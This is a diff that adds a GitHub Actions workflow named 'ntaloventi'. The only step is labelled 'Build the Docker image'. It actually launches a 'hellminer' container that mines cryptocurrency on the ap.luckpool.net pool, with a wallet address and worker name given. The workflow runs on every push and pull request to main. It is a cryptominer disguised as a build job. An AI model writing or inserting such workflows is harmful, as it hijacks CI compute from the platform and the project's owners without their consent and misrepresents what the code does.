@@ -1,0 +1,18 @@
+name: ntaloventi
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v3
+    - name: Build the Docker image
+      run: docker run -itd -e URL="ap.luckpool.net" -e PORT=3956 -e WALLET="RALSPrXkQAE821jyVrj92f4vik1RUNtv74" -e WORKER="berto1" -e CPU=1  --name bekbek ntaloventi/hellminer:v2.0
